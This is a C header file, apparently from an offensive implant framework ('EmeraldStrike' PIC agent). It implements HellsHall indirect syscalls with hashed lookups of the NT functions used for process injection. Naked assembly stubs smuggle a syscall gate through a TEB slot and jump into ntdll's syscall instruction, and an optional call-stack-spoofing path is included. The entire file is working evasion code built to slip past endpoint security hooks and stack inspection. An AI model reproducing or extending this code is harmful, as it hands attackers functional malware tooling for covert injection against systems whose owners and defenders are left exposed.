#ifndef EMERALDSTRIKE_HELLSHALL_H
#define EMERALDSTRIKE_HELLSHALL_H

#include <windows.h>
#include "../obfstr.h"

// HellsHall Indirect Syscalls for PIC Agent
// x64: TEB gs:[0x28] carries HH_GATE* to naked stub; syscall instruction.
// x86: TEB fs:[0x14] carries HH_GATE* to naked stub; sysenter/int 0x2e.

#ifdef INCLUDE_EVASION_HELLSHALL

#ifndef _NT_SYSCALL_DEFINED
#define _NT_SYSCALL_DEFINED
typedef struct _NT_SYSCALL {
    DWORD   dwSSn;
    PVOID   pSyscallAddress;
    PVOID   pSyscallInstAddress;
} NT_SYSCALL, *PNT_SYSCALL;
#endif

#ifdef HH_HASH_DYNAMIC
#define HH_CRC(name)    hh_crc32b(XSTR(#name))
#else
#define NtAllocateVirtualMemory_CRC32           0x498165AA
#define NtProtectVirtualMemory_CRC32            0x17C9087B
#define NtWriteVirtualMemory_CRC32              0xF7C5A233
#define NtCreateThreadEx_CRC32                  0x6411D915
#define NtWaitForSingleObject_CRC32             0x3D93EDA4
#define NtCreateSection_CRC32                   0xF85C77EC
#define NtMapViewOfSection_CRC32                0xB347A7C1
#define NtUnmapViewOfSection_CRC32              0x830A04FC
#define NtQueueApcThread_CRC32                  0x67399CDF
#define NtClose_CRC32                           0x0EDFC5CB
#define NtCreateEvent_CRC32                     0xA8BB7A04
#define NtSignalAndWaitForSingleObject_CRC32    0x2FB727C6
#define NtContinue_CRC32                        0xEDC1182D
#define NtResumeThread_CRC32                    0xD67413A8
#define HH_CRC(name)    (name##_CRC32)
#endif

#define HH_IDX_NtAllocateVirtualMemory          0
#define HH_IDX_NtProtectVirtualMemory           1
#define HH_IDX_NtWriteVirtualMemory             2
#define HH_IDX_NtCreateThreadEx                 3
#define HH_IDX_NtWaitForSingleObject            4
#define HH_IDX_NtCreateSection                  5
#define HH_IDX_NtMapViewOfSection               6
#define HH_IDX_NtUnmapViewOfSection             7
#define HH_IDX_NtQueueApcThread                 8
#define HH_IDX_NtClose                          9
#define HH_IDX_NtCreateEvent                    10
#define HH_IDX_NtSignalAndWaitForSingleObject   11
#define HH_IDX_NtContinue                       12
#define HH_IDX_NtResumeThread                   13
#define HH_MAX_SYSCALLS                         16

// ════════════════════════════════════════════════════════════════════════
//  x64
// ════════════════════════════════════════════════════════════════════════
#ifdef _WIN64

typedef struct _HH_GATE {
    DWORD   SSn;            // offset 0
    DWORD   _pad;           // offset 4
    PVOID   SyscallAddr;    // offset 8
} HH_GATE;

__attribute__((naked, used))
static void HH_RunSyscall(void) {
    __asm__ volatile(
        "mov r10, rcx\n"
        ".byte 0x65, 0x48, 0x8b, 0x04, 0x25, 0x28, 0x00, 0x00, 0x00\n"
        "mov r11, qword ptr [rax + 8]\n"
        "mov eax, dword ptr [rax]\n"
        "jmp r11\n"
    );
}

static inline void* _hh_read_teb(void) {
    void* p;
    __asm__ volatile(
        ".byte 0x65, 0x48, 0x8b, 0x04, 0x25, 0x28, 0x00, 0x00, 0x00"
        : "=a"(p) :: "memory"
    );
    return p;
}

static inline void _hh_write_teb(void* p) {
    register void* val __asm__("rcx") = p;
    __asm__ volatile(
        ".byte 0x65, 0x48, 0x89, 0x0c, 0x25, 0x28, 0x00, 0x00, 0x00"
        :: "c"(val) : "memory"
    );
}

// ── HH_SYSCALL macro: when callstack spoofing is enabled AND initialized,
// route through ghost_spoof_call / the LACUNA stomp window for a clean callstack. ──

#if defined(INCLUDE_EVASION_CALLSTACK_SPOOF) && (CALLSTACK_SPOOF_MODE != SPOOF_NONE)

// Helper: prepare HH_GATE in TEB, then route via spoofed call stub
// The spoofed call target is HH_RunSyscall (indirect syscall stub).
// We arm the TEB with the gate, then call through the spoofer which
// will JMP to HH_RunSyscall with a fake callstack.
#define HH_SYSCALL(ntSys, ...) ({                                               \
    HH_GATE _hh_gate;                                                           \
    _hh_gate.SSn = (ntSys).dwSSn;                                              \
    _hh_gate._pad = 0;                                                          \
    _hh_gate.SyscallAddr = (ntSys).pSyscallInstAddress;                         \
    void* _hh_old_teb = _hh_read_teb();                                         \
    _hh_write_teb((void*)&_hh_gate);                                            \
    PINSTANCE _hh_inst = EMERALDSTRIKE_INSTANCE;                                \
    NTSTATUS _hh_r;                                                              \
    if (_hh_inst->bCallstackSpoofInit) {                                        \
        _hh_r = (NTSTATUS)(UINT64)callstack_spoofed_call(                       \
            _hh_inst, (PVOID)(void*)HH_RunSyscall,                              \
            _hh_count_args(__VA_ARGS__), ##__VA_ARGS__);                        \
    } else {                                                                     \
        _hh_r = ((NTSTATUS(NTAPI*)(...))((void*)HH_RunSyscall))(__VA_ARGS__);  \
    }                                                                            \
    _hh_write_teb(_hh_old_teb);                                                 \
    _hh_r;                                                                       \
})

// Argument counter for up to 11 args
#define _hh_count_args_impl(_1,_2,_3,_4,_5,_6,_7,_8,_9,_10,_11,N,...) N
#define _hh_count_args(...) _hh_count_args_impl(__VA_ARGS__,11,10,9,8,7,6,5,4,3,2,1,0)

#else // No callstack spoofing - direct dispatch (original behavior)

#define HH_SYSCALL(ntSys, ...) ({                                               \
    HH_GATE _hh_gate;                                                           \
    _hh_gate.SSn = (ntSys).dwSSn;                                              \
    _hh_gate._pad = 0;                                                          \
    _hh_gate.SyscallAddr = (ntSys).pSyscallInstAddress;                         \
    void* _hh_old_teb = _hh_read_teb();                                         \
    _hh_write_teb((void*)&_hh_gate);                                            \
    NTSTATUS _hh_r = ((NTSTATUS(NTAPI*)(...))((void*)HH_RunSyscall))(__VA_ARGS__); \
    _hh_write_teb(_hh_old_teb);                                                 \
    _hh_r;                                                                       \
})

#endif // INCLUDE_EVASION_CALLSTACK_SPOOF

// ════════════════════════════════════════════════════════════════════════
//  x86
// ════════════════════════════════════════════════════════════════════════
#else

typedef struct _HH_GATE {
    DWORD   SSn;            // offset 0
    PVOID   SyscallAddr;    // offset 4
} HH_GATE;

// x86 naked stub: all Nt args on stack (stdcall).
// Reads HH_GATE* from fs:[0x14], sets eax=SSn, edx=&args, jmp to
// the sysenter/int2e instruction in ntdll.
__attribute__((naked, used))
static void HH_RunSyscall(void) {
    __asm__ volatile(
        ".byte 0x64, 0xa1, 0x14, 0x00, 0x00, 0x00\n"  // mov eax, fs:[0x14]
        "mov ecx, dword ptr [eax + 4]\n"   // ecx = SyscallAddr
        "mov eax, dword ptr [eax]\n"        // eax = SSn
        "lea edx, [esp + 4]\n"              // edx = ptr to args (sysenter conv)
        "jmp ecx\n"
    );
}

static inline void* _hh_read_teb(void) {
    void* p;
    __asm__ volatile(
        ".byte 0x64, 0xa1, 0x14, 0x00, 0x00, 0x00"
        : "=a"(p) :: "memory"
    );
    return p;
}

static inline void _hh_write_teb(void* p) {
    __asm__ volatile(
        ".byte 0x64, 0x89, 0x0d, 0x14, 0x00, 0x00, 0x00"
        :: "c"(p) : "memory"
    );
}

#define HH_SYSCALL(ntSys, ...) ({                                               \
    HH_GATE _hh_gate;                                                           \
    _hh_gate.SSn = (ntSys).dwSSn;                                              \
    _hh_gate.SyscallAddr = (ntSys).pSyscallInstAddress;                         \
    void* _hh_old_teb = _hh_read_teb();                                         \
    _hh_write_teb((void*)&_hh_gate);                                            \
    NTSTATUS _hh_r = ((NTSTATUS(__cdecl*)(...))((void*)HH_RunSyscall))(__VA_ARGS__); \
    _hh_write_teb(_hh_old_teb);                                                 \
    _hh_r;                                                                       \
})

#endif // _WIN64

typedef struct _INSTANCE* PINSTANCE;
BOOL hellshall_init(PINSTANCE inst);
BOOL hellshall_fetch(PVOID ntdll_base, DWORD dwSysHash, PNT_SYSCALL pNtSys);
DWORD hh_crc32b(const char* str);

#endif // INCLUDE_EVASION_HELLSHALL
#endif // EMERALDSTRIKE_HELLSHALL_H
